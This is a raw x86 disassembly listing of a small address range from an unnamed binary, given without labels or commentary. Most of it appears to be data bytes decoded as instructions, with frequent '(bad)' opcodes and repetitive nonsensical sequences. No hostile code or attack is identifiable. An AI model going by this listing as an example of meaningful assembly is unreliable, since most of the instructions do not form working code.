  4225d1:	ins    DWORD PTR es:[edi],dx
  4225d2:	imul   DWORD PTR [edi+0x17]
  4225d5:	dec    edi
  4225d6:	adc    eax,0x37a59149
  4225db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225dc:	fwait
  4225dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225de:	jae    0x422585
  4225e0:	popf   
  4225e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e2:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  4225e8:	(bad)  
  4225e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ea:	fwait
  4225eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ec:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  4225f3:	dec    ebp
  4225f4:	test   DWORD PTR [edi+0x16],0x91a914af
  4225fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fc:	aaa    
  4225fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fe:	fwait
  4225ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422600:	jae    0x4225a7
  422602:	popf   
  422603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422604:	pop    ss
  422605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422606:	xchg   ebp,eax
  422607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422608:	push   ecx
  422609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422610:	rol    DWORD PTR [ebx-0x2f],cl
  422613:	dec    ebp
  422614:	lock lods eax,DWORD PTR ds:[esi]
  422616:	imul   BYTE PTR [edi-0x76eb70ea]
  42261c:	xchg   ecx,eax
  42261d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261e:	aaa    
  42261f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422620:	fwait
  422621:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422622:	jae    0x4225c9
  422624:	popf   
  422625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422626:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42262c:	(bad)  
  42262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262e:	fwait
  42262f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422630:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422636:	lock (bad) 
  422638:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42263f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422640:	aaa    
  422641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422642:	fwait
  422643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422644:	jae    0x4225eb
  422646:	popf   
  422647:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422648:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  42264e:	(bad)  
  42264f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422650:	fwait
  422651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422652:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  422659:	in     eax,dx
  42265a:	imul   bh
  42265c:	push   ss
  42265d:	iret   
  42265e:	adc    al,0xc9
  422660:	xchg   ecx,eax
  422661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422662:	cmp    eax,0x51a59ba5
  422667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422668:	popf   
  422669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266a:	jnp    0x422611
  42266c:	xchg   ebx,eax
  42266d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266e:	fwait
  42266f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422670:	xchg   ecx,eax
  422671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422672:	shl    bl,cl
  422674:	shr    ch,1
  422676:	lock int 0xf6
  422679:	iret   
  42267a:	push   ss
  42267b:	das    
  42267c:	adc    al,0x29
  42267e:	push   ss
  42267f:	unpcklps xmm1,XMMWORD PTR [ecx]
  422682:	xchg   ebx,eax
  422683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422684:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  42268a:	lahf   
  42268b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268c:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  422692:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422698:	shl    BYTE PTR [ebx],cl
  42269a:	shr    BYTE PTR ds:0xff60df0,1
  4226a0:	push   ss
  4226a1:	outs   dx,DWORD PTR ds:[esi]
  4226a2:	adc    al,0x69
  4226a4:	xchg   ecx,eax
  4226a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a6:	add    BYTE PTR [eax],al
  4226a8:	xor    BYTE PTR ds:0x273c0042,ah
  4226ae:	inc    edx
  4226af:	add    BYTE PTR [edi+eiz*1+0x42],al
  4226b3:	add    ah,cl
  4226b5:	sub    BYTE PTR [edx+0x0],al
  4226b8:	sub    BYTE PTR ds:0x27480042,ah
  4226be:	inc    edx
  4226bf:	add    BYTE PTR [esi+0x7e],ch
  4226c2:	inc    edx
  4226c3:	add    dh,ah
  4226c5:	add    BYTE PTR [edx+0x0],0x38
  4226c9:	sub    BYTE PTR [edx+0x0],al
  4226cc:	mov    esp,0x24004228
  4226d1:	daa    
  4226d2:	inc    edx
  4226d3:	add    BYTE PTR [eax],ch
  4226d5:	daa    
  4226d6:	inc    edx
  4226d7:	add    BYTE PTR [eax-0x73ffbdd8],bh
  4226dd:	daa    
  4226de:	inc    edx
  4226df:	add    BYTE PTR [edx-0x36],cl
  4226e2:	push   es
  4226e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e4:	scas   al,BYTE PTR es:[edi]
  4226e5:	or     eax,0x2740a506
  4226ea:	inc    edx
  4226eb:	add    al,dh
  4226ed:	daa    
  4226ee:	inc    edx
  4226ef:	add    BYTE PTR [eax+ebp*1],al
  4226f2:	inc    edx
  4226f3:	add    BYTE PTR [eax],dl
  4226f5:	sub    BYTE PTR [edx+0x0],al
  4226f8:	and    BYTE PTR [eax],ch
  4226fa:	inc    edx
  4226fb:	add    BYTE PTR [eax+0x27],bh
  4226fe:	inc    edx
  4226ff:	add    BYTE PTR [eiz*1+0x27980042],ch
  422706:	inc    edx
  422707:	add    BYTE PTR [eax-0x2fffbdd9],cl
  42270d:	sub    BYTE PTR [edx+0x0],al
  422710:	scas   al,BYTE PTR es:[edi]
  422711:	fwait
  422712:	push   es
  422713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422714:	cmp    BYTE PTR [edx-0x19],al
  422717:	mov    esp,0x4227a8
  42271c:	mov    al,0x27
  42271e:	inc    edx
  42271f:	add    BYTE PTR [edi+eiz*1+0x42],cl
  422723:	add    BYTE PTR [esi+eax*4],ah
  422726:	loopne 0x4226e4
  422728:	jbe    0x4227a4
  42272a:	pop    ds
  42272b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42272c:	add    BYTE PTR [eax],al
  42272e:	inc    eax
  42272f:	add    cl,dh
  422731:	retf   
  422732:	arpl   WORD PTR [eax-0x1d],bx
  422735:	add    BYTE PTR [edx+0x0],0xa8
  422739:	js     0x422723
  42273b:	push   0x77
  42273d:	push   cs
  42273e:	pop    ebx
  42273f:	xor    BYTE PTR [esi-0x6],dh
  422742:	(bad)  
  422743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422744:	mov    dl,0xd
  422746:	xchg   ebx,eax
  422747:	test   eax,0x422734
  42274c:	stos   BYTE PTR es:[edi],al
  42274d:	fild   DWORD PTR [esi]
  42274f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422750:	stos   BYTE PTR es:[edi],al
  422751:	fild   WORD PTR [esi]
  422753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422755:	fild   DWORD PTR [esi]
  422757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422758:	mov    ds:0xbea506db,al
  42275d:	fild   DWORD PTR [esi]
  42275f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422760:	mov    edx,0xb6a506db
  422765:	fild   DWORD PTR [esi]
  422767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422768:	mov    dl,0xdb
  42276a:	push   es
  42276b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42276c:	mov    ds,ebx
  42276e:	push   es
  42276f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422770:	mov    bl,bl
  422772:	push   es
  422773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422774:	out    dx,al
  422775:	fild   DWORD PTR [esi]
  422777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422778:	dec    DWORD PTR [edx]
  42277a:	adc    edi,DWORD PTR [ebx]
  42277c:	and    al,0x25
  42277e:	inc    edx
  42277f:	add    BYTE PTR ds:0x6100422a,dl
  422785:	jae    0x4227ef
  422787:	jns    0x422737
  422789:	fwait
  42278a:	push   es
  42278b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42278c:	cmp    cl,dl
  42278e:	xlat   BYTE PTR ds:[ebx]
  42278f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422790:	dec    sp
  422792:	add    BYTE PTR [eax],al
  422794:	and    BYTE PTR ds:0x42220042,ah
  42279a:	sbb    eax,DWORD PTR [ebx+0x0]
	...
  4227a8:	hlt    
  4227a9:	stc    
  4227aa:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  4227b1:	inc    esi
  4227b2:	pop    ds
  4227b3:	jg     0x4227b5
	...
  4227d9:	add    BYTE PTR [eax],al
  4227db:	add    BYTE PTR [esi+0x7e],ch
  4227de:	inc    edx
	...
  4227eb:	add    BYTE PTR [edi-0x4c],al
  4227ee:	inc    ecx
  4227ef:	add    BYTE PTR [ebp-0x5b],cl
  4227f2:	push   ecx
  4227f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f4:	jg     0x42279b
  4227f6:	inc    edi
  4227f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f8:	push   ecx
  4227f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fa:	inc    ebx
  4227fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fc:	std    
  4227fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227fe:	jmp    DWORD PTR [ebp+0xa59b]
  422804:	push   ebp
  422805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422806:	push   ebx
  422807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422808:	dec    ecx
  422809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280a:	std    
  42280b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42280c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422812:	jge    0x4227b9
  422814:	push   ecx
  422815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422816:	jg     0x4227bd
  422818:	std    
  422819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42281a:	jmp    DWORD PTR [ebp+0xa59b]
  422820:	jge    0x4227c7
  422822:	dec    ebx
  422823:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422824:	inc    ebx
  422825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422826:	jne    0x4227cd
  422828:	pop    ecx
  422829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42282a:	jnp    0x4227d1
  42282c:	dec    ecx
  42282d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42282e:	fwait
  42282f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422838:	xor    eax,ecx
  42283a:	xor    esp,DWORD PTR [ecx]
  42283c:	xor    eax,DWORD PTR [ecx]
  42283e:	xor    esp,DWORD PTR [ecx+0x33]
  422841:	inc    ecx
  422842:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  422848:	xor    al,cl
  42284a:	xor    ah,BYTE PTR [ecx]
  42284c:	xor    al,BYTE PTR [ecx]
  42284e:	xor    ah,BYTE PTR [ecx+0x32]
  422851:	inc    ecx
  422852:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  422858:	xor    ecx,ebp
  42285a:	xor    ecx,edi
  42285c:	xor    ecx,ecx
  42285e:	xor    ecx,ebx
  422860:	xor    edx,ebp
  422862:	xor    edx,edi
  422864:	xor    edx,ecx
  422866:	xor    edx,ebx
  422868:	xor    ebx,ebp
  42286a:	xor    ebx,edi
  42286c:	xor    ebx,ecx
  42286e:	xor    ebx,ebx
  422870:	xor    eax,edi
  422872:	push   ebx
  422873:	shl    DWORD PTR [ebx-0x3f],0x93
  422877:	rcl    BYTE PTR [esi-0x55],0x15
  42287b:	iret   
  42287c:	xchg   ebp,eax
  42287d:	dec    eax
  42287e:	xor    ecx,ebp
  422880:	sbb    eax,0x50aaaae3
  422885:	imul   ebx,DWORD PTR [esi],0x2f
  422888:	je     0x42289f
  42288a:	mov    DWORD PTR [edx+0x556ad694],ecx
  422890:	imul   edi,ebx,0xffffffd5
  422893:	enter  0x4927,0xef
  422897:	popf   
  422898:	mov    dh,0xde
  42289a:	dec    esi
  42289b:	xchg   esp,eax
  42289c:	lock xor BYTE PTR [esi-0x6b],ch
  4228a0:	inc    ebp
  4228a1:	or     al,0x76
  4228a3:	or     DWORD PTR [edi-0x40],eax
  4228a6:	js     0x422862
  4228a8:	popa   
  4228a9:	pop    eax
  4228aa:	jecxz  0x422916
  4228ac:	mov    BYTE PTR [ebx-0x56],0x4
  4228b0:	cs leave 
  4228b2:	inc    esi
  4228b3:	stos   DWORD PTR es:[edi],eax
  4228b4:	inc    esp
  4228b5:	ds inc ebp
  4228b7:	enter  0x82f6,0x93
  4228bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228bc:	sbb    DWORD PTR [eax],ecx
  4228be:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  4228c2:	inc    edx
  4228c3:	add    cl,dl
  4228c5:	ja     0x422936
  4228c7:	gs sub al,0x27
  4228ca:	inc    edx
  4228cb:	add    BYTE PTR [eax+0x76004227],dl
  4228d1:	cli    
  4228d2:	fbld   TBYTE PTR [eax+eax*1+0x0]
  4228d9:	add    BYTE PTR [eax],al
  4228db:	add    BYTE PTR [eax],al
  4228dd:	add    BYTE PTR [eax],al
  4228df:	add    BYTE PTR [eax-0x15],bl
  4228e2:	push   ss
  4228e3:	cmp    eax,0x65646543
  4228e8:	push   esi
  4228e9:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  4228f1:	jb     0x422967
  4228f3:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  4228f8:	jecxz  0x4228c1
  4228fa:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  4228ff:	cmp    al,BYTE PTR [esi-0x2d]
  422902:	jno    0x42297e
  422904:	outs   dx,DWORD PTR ds:[esi]
  422905:	jae    0x422977
  422907:	popa   
  422908:	je     0x422972
  42290a:	bound  esp,QWORD PTR [ecx+0x73]
  42290d:	je     0x42297e
  42290f:	outs   dx,DWORD PTR ds:[esi]
  422910:	test   eax,0xde3655f5
  422915:	in     al,0x6c
  422917:	jne    0x422981
  422919:	bound  esp,QWORD PTR [ebp+0x4b]
  42291c:	popa   
  42291d:	jbe    0x422980
  42291f:	outs   dx,WORD PTR ds:[esi]
  422921:	jns    0x422992
  422923:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422929:	pusha  
  42292a:	and    BYTE PTR [edi+0x79],dh
  42292d:	gs jo  0x42299f
  422930:	ins    DWORD PTR es:[edi],dx
  422931:	ja     0x4229ac
  422933:	gs inc ebp
  422935:	jns    0x42299c
  422937:	jb     0x422939
	...
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [esi-0x4e],dl
  42294e:	and    dl,BYTE PTR [ecx]
  422950:	imul   esp,DWORD PTR [ebx+0x75],0x74
  422954:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  42295c:	fldcw  WORD PTR [eax+edx*2]
  42295f:	fimul  WORD PTR [ebx]
  422961:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  422965:	fldcw  WORD PTR [eax+0x69]
  422968:	lods   al,BYTE PTR ds:[esi]
  422969:	repnz retf 0xe41c
  42296d:	inc    ebx
  42296e:	outs   dx,DWORD PTR ds:[esi]
  42296f:	je     0x4229e4
  422971:	dec    esp
  422972:	popa   
  422973:	jp     0x4229ee
  422975:	push   ebx
  422976:	imul   esp,DWORD PTR [ecx+0x73],0x73
  42297a:	push   0xc3066a00
  42297f:	lds    eax,FWORD PTR [eax+0x6569646f]
  422985:	add    al,bl
  422987:	mov    ebp,0x2ee9d1e4
  42298c:	jle    0x422940
  42298e:	data16 gs ja 0x422a05
  422992:	jne    0x4229f6
  422994:	add    BYTE PTR [eax],al
  422996:	add    DWORD PTR [edx+0x51cf72f8],edi
  42299c:	fstp   DWORD PTR [eax+0x74]
  42299f:	popa   
  4229a0:	jae    0x422a14
  4229a2:	popa   
  4229a3:	js     0x422a0d
  4229a5:	outs   dx,DWORD PTR ds:[esi]
  4229a6:	add    BYTE PTR [eax],al
  4229a8:	mov    esi,0x4d270df8
  4229ad:	popa   
  4229ae:	ins    BYTE PTR es:[edi],dx
  4229af:	je     0x4229fd
  4229b1:	jne    0x422a25
  4229b3:	imul   eax,DWORD PTR [eax],0x0
  4229b6:	dec    edx
  4229b7:	loope  0x4229c7
  4229b9:	out    0xd3,al
  4229bb:	test   al,0x57
  4229bd:	popa   
  4229be:	jb     0x422a2b
  4229c0:	jne    0x422a36
  4229c2:	outs   dx,DWORD PTR fs:[esi]
  4229c4:	bound  ebp,QWORD PTR [edi+0x0]
  4229c7:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  4229ce:	jne    0x422a3d
  4229d0:	outs   dx,DWORD PTR ds:[esi]
  4229d1:	js     0x4229d3
  4229d3:	add    BYTE PTR [ecx+edx*8+0x58],ch
  4229d7:	or     bh,BYTE PTR [ecx+ebx*2]
  4229da:	add    al,0xd6
  4229dc:	gs ins DWORD PTR es:[edi],dx
  4229de:	jns    0x422a4f
  4229e0:	jo     0x422a57
  4229e2:	je     0x422a37
  4229e4:	push   0x6170676f
  4229e9:	jns    0x422a55
  4229eb:	outs   dx,DWORD PTR ds:[esi]
  4229ec:	popa   
  4229ed:	jns    0x4229a9
  4229ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229f0:	scas   al,BYTE PTR es:[edi]
  4229f1:	or     al,0xaf
  4229f3:	adc    al,0x63
  4229f5:	popa   
  4229f6:	jns    0x422a3f
  4229f8:	jne    0x422a70
  4229fa:	jae    0x422a70
  4229fc:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a03:	jb     0x422a6a
  422a05:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a09:	(bad)  
  422a0a:	out    dx,al
  422a0b:	push   ebx
  422a0c:	popa   
  422a0d:	arpl   WORD PTR [ebx+0x66],si
  422a10:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a17:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a1d:	push   eax
  422a1e:	ja     0x4229aa
  422a20:	cdq    
  422a21:	adc    bh,0x8a
  422a24:	pop    esi
  422a25:	fldenv [ecx+0x6f5038a6]
  422a2b:	adc    bh,0x8b
  422a2e:	arpl   WORD PTR [edx],si
  422a30:	test   eax,0x92fcefd7
  422a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a36:	xchg   ah,bh
  422a38:	fsubr  st,st(7)
  422a3a:	arpl   sp,di
  422a3c:	fsub   DWORD PTR [esi+0xc92fc86]
  422a42:	cdq    
  422a43:	jo     0x422ab9
  422a45:	xchg   edi,eax
  422a46:	add    BYTE PTR [edi+0x77019696],0x8b
  422a4d:	push   eax
  422a4e:	ja     0x4229da
  422a50:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422a57:	cmp    BYTE PTR [eax+0xc],dl
  422a5a:	adc    BYTE PTR [edi-0x28089c75],0x9
  422a61:	xor    BYTE PTR [edi-0x11],0xfc
  422a65:	xchg   edx,eax
  422a66:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422a6c:	cld    
  422a6d:	xchg   edx,eax
  422a6e:	outs   dx,DWORD PTR ds:[esi]
  422a6f:	mov    ds:0x31ec92fc,eax
  422a74:	jo     0x422a71
  422a76:	out    dx,al
  422a77:	lea    edx,[edi-0x69697880]
  422a7d:	add    DWORD PTR [edi-0x75],esi
  422a80:	push   eax
  422a81:	ja     0x422a0d
  422a83:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422a8a:	hlt    
  422a8b:	push   eax
  422a8c:	or     al,0x80
  422a8e:	xchg   edi,eax
  422a8f:	mov    esp,DWORD PTR [ebx-0x9]
  422a92:	xlat   BYTE PTR ds:[ebx]
  422a93:	out    dx,al
  422a94:	cld    
  422a95:	xchg   edx,eax
  422a96:	mov    WORD PTR [ebx],ss
  422a98:	xor    BYTE PTR [edi-0x11],0xfc
  422a9c:	xchg   edx,eax
  422a9d:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422aa3:	jo     0x422aa0
  422aa5:	out    dx,al
  422aa6:	lea    edx,[edi-0x69697880]
  422aac:	add    DWORD PTR [edi-0x75],esi
  422aaf:	push   eax
  422ab0:	ja     0x422a3c
  422ab2:	cdq    
  422ab3:	adc    bh,0x8a
  422ab6:	pop    esi
  422ab7:	fsubrp st(7),st
  422ab9:	xor    edi,DWORD PTR [eax+edx*2]
  422abc:	outs   dx,DWORD PTR ds:[esi]
  422abd:	adc    bh,0x8b
  422ac0:	arpl   WORD PTR [edx],si
  422ac2:	test   eax,0xd8fca6d7
  422ac7:	out    dx,al
  422ac8:	fwait
  422ac9:	mov    ecx,0x31ec927c
  422ace:	fwait
  422acf:	cld    
  422ad0:	or     al,0x43
  422ad2:	jo     0x422b48
  422ad4:	xchg   edi,eax
  422ad5:	add    BYTE PTR [edi+0x77019696],0x8b
  422adc:	push   eax
  422add:	ja     0x422a69
  422adf:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422ae6:	cmp    BYTE PTR [eax+0xc],dl
  422ae9:	adc    BYTE PTR [edi-0x28089c75],0xff
  422af0:	xor    BYTE PTR [edi-0x11],0xfc
  422af4:	xchg   edx,eax
  422af5:	out    dx,eax
  422af6:	mov    ds:0x963a6dfc,eax
  422afb:	cld    
  422afc:	xchg   edx,eax
  422afd:	das    
  422afe:	stos   DWORD PTR es:[edi],eax
  422aff:	jo     0x422afc
  422b01:	out    dx,al
  422b02:	lea    ebx,[ebx-0x7f686c67]
  422b08:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b0e:	cmp    eax,0xd7808a0a
  422b13:	sbb    eax,0x9925d73a
  422b18:	adc    bh,0x15
  422b1b:	dec    eax
  422b1c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b22:	std    
  422b23:	dec    ebp
  422b24:	xchg   esp,eax
  422b25:	test   BYTE PTR [ebx-0x9],cl
  422b28:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b2e:	xchg   esp,eax
  422b2f:	test   BYTE PTR [ebx-0x9],cl
  422b32:	or     cl,BYTE PTR [esi+edi*8]
  422b35:	or     BYTE PTR ds:0x432187ed,0x6a
  422b3c:	ins    DWORD PTR es:[edi],dx
  422b3d:	or     cl,BYTE PTR [edx]
  422b3f:	or     cl,BYTE PTR [edx]
  422b41:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422b47:	adc    DWORD PTR [ebp+0x5e],ecx
  422b4a:	(bad)  
  422b4b:	in     al,dx
  422b4c:	lea    ecx,[ebp+0x10018494]
  422b52:	pop    ecx
  422b53:	mov    WORD PTR [ebp-0x1172a173],cs
  422b59:	(bad)  
  422b5a:	out    dx,al
  422b5b:	mov    dh,0xbe
  422b5d:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422b62:	xchg   BYTE PTR [ecx+0xc],ah
  422b65:	lea    ecx,[ebp+0x5901cbf8]
  422b6b:	add    DWORD PTR [ebx-0x80],ebp
  422b6e:	out    0x8a,eax
  422b70:	xor    BYTE PTR [edi+0x32],0x43
  422b74:	out    0x35,eax
  422b76:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422b7a:	xchg   BYTE PTR [edx-0x73],ah
  422b7d:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422b83:	dec    edi
  422b84:	repnz lea ecx,[ebp-0x370f7073]
  422b8b:	xor    esp,edi
  422b8d:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422b94:	mov    al,ds:0xec9d8894
  422b99:	or     eax,0xeb6501a9
  422b9e:	mov    dl,0xbc
  422ba0:	out    dx,eax
  422ba1:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422ba8:	mov    eax,ds:0x99968d8d
  422bad:	cli    
  422bae:	lea    edi,[edx]
  422bb0:	lea    ecx,[ebp-0x1bc59df6]
  422bb6:	push   ebp
  422bb7:	and    bh,0x8a
  422bba:	inc    ebx
  422bbb:	out    0x83,eax
  422bbd:	or     eax,esp
  422bbf:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422bc6:	push   ecx
  422bc7:	xor    ecx,DWORD PTR [ebx-0x14]
  422bca:	push   ecx
  422bcb:	add    ebp,eax
  422bcd:	lock lea eax,[esi-0x7272f3a0]
  422bd4:	cmp    ch,0xb2
  422bd7:	mov    bh,ch
  422bd9:	in     eax,dx
  422bda:	mov    edx,0xfa05633a
  422bdf:	lea    edi,[edx]
  422be1:	lea    ecx,[ebp-0x39c5e29]
  422be7:	in     al,0x9c
  422be9:	les    esp,FWORD PTR [edi]
  422beb:	add    bh,0xaf
  422bee:	xchg   cl,ch
  422bf0:	or     al,0x8d
  422bf2:	(bad)  
  422bf3:	loop   0x422c2f
  422bf5:	scas   al,BYTE PTR es:[edi]
  422bf6:	in     al,dx
  422bf7:	sti    
  422bf8:	in     al,dx
  422bf9:	ret    0x86ed
  422bfc:	cmp    ch,ch
  422bfe:	mov    BYTE PTR [edx],bh
  422c00:	sub    BYTE PTR [edx+0x63],0xfc
  422c04:	sub    BYTE PTR [edx-0x1c],0xb4
  422c08:	scas   al,BYTE PTR es:[edi]
  422c09:	fsubr  st,st(5)
  422c0b:	test   DWORD PTR [edi],ebp
  422c0d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c13:	in     eax,dx
  422c14:	test   edi,edi
  422c16:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c1c:	out    dx,al
  422c1d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c24:	(bad)  
  422c25:	leave  
  422c26:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c2c:	or     al,0x8d
  422c2e:	(bad)  
  422c2f:	xlat   BYTE PTR ds:[ebx]
  422c30:	adc    eax,0x9faeab9d
  422c35:	scas   al,BYTE PTR es:[edi]
  422c36:	lahf   
  422c37:	dec    ebp
  422c38:	push   ebp
  422c39:	xor    eax,0xb5f1aa96
  422c3e:	outs   dx,DWORD PTR ds:[esi]
  422c3f:	lea    ecx,[ebp-0x2c3b7272]
  422c45:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422c4b:	or     al,0x8d
  422c4d:	(bad)  
  422c4e:	xlat   BYTE PTR ds:[ebx]
  422c4f:	dec    ecx
  422c50:	bound  eax,QWORD PTR ds:0x1786fd0d
  422c56:	or     al,0x8d
  422c58:	(bad)  
  422c59:	xlat   BYTE PTR ds:[ebx]
  422c5a:	xchg   ebx,eax
  422c5b:	popf   
  422c5c:	mov    WORD PTR gs:[edx+0x30],fs
  422c60:	in     al,0xc
  422c62:	(bad)  
  422c63:	dec    DWORD PTR [edx]
  422c65:	adc    bh,0x8a
  422c68:	inc    ebx
  422c69:	xlat   BYTE PTR ds:[ebx]
  422c6a:	and    DWORD PTR [ebx-0x29],0x35
  422c6e:	or     edx,ebp
  422c70:	mov    dh,0x3a
  422c72:	lea    ecx,[ebp-0x75187fba]
  422c78:	cmc    
  422c79:	mov    esi,0x8d8d3adc
  422c7e:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422c84:	lea    eax,[eax+0x23d582d7]
  422c8a:	(bad)  
  422c8b:	stc    
  422c8c:	xchg   BYTE PTR [eax],cl
  422c8e:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422c94:	aad    0x30
  422c96:	adc    bh,0xf7
  422c99:	xor    al,0x7a
  422c9c:	push   eax
  422c9d:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422ca8:	push   eax
  422ca9:	lock adc BYTE PTR [eax-0x29],0x83
  422cae:	popf   
  422caf:	stos   DWORD PTR es:[edi],eax
  422cb0:	lahf   
  422cb1:	icebp  
  422cb2:	mov    ebp,0x8e8d8da6
  422cb7:	out    dx,eax
  422cb8:	in     al,dx
  422cb9:	pushf  
  422cba:	stos   BYTE PTR es:[edi],al
  422cbb:	fwait
